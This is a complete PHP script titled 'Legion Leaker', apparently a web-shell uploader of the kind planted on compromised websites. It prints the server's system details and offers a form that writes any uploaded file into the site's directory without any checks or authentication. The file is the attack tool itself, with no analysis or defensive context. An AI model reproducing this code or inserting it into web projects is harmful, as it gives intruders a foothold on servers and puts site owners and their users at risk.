<?php
            echo '<title>! Legion Leaker !</title>';
            echo '<center><b><font face="Courier new" color="black" size="6">| Legion Leaker |</b></font><br>';
            echo "<b>".php_uname()."</b><br>";
            echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
            echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
            if( $_POST['_upl'] == "Upload" ) {
            if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded ! :)<b><br><br>'; }
            else { echo '<b>Not uploaded ! </b><br><br>';}
            }?>
